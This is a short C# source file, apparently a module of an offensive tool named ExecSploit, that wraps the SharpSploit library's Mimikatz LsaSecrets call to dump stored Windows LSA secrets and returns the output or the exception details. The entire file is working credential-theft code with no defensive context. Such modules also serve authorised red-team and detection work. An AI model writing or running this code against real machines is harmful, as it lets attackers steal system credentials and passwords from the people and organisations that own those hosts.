using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class LsaSecrets
    {
        public static string Execute()
        {
            try
            {
                return SharpSploit.Credentials.Mimikatz.LsaSecrets();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}